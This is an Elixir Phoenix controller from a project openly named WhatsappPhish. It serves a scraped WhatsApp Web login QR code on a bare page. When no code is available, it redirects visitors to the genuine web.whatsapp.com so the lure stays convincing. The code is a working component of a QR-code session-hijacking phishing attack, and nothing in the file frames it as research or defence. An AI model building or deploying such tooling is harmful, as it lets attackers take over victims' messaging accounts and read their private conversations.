defmodule WhatsappPhishWeb.PageController do
  use WhatsappPhishWeb, :controller
  alias WhatsappPhish.WhatsappScraper

  plug :put_layout, false
  def index(conn, _params) do
    qr_code = WhatsappPhish.WhatsappScraperServer.get_qr_code()
    case qr_code do
      nil -> redirect conn, external: "https://web.whatsapp.com"
      qr_code -> render conn, "index.html", qr_code: qr_code
    end
  end
end
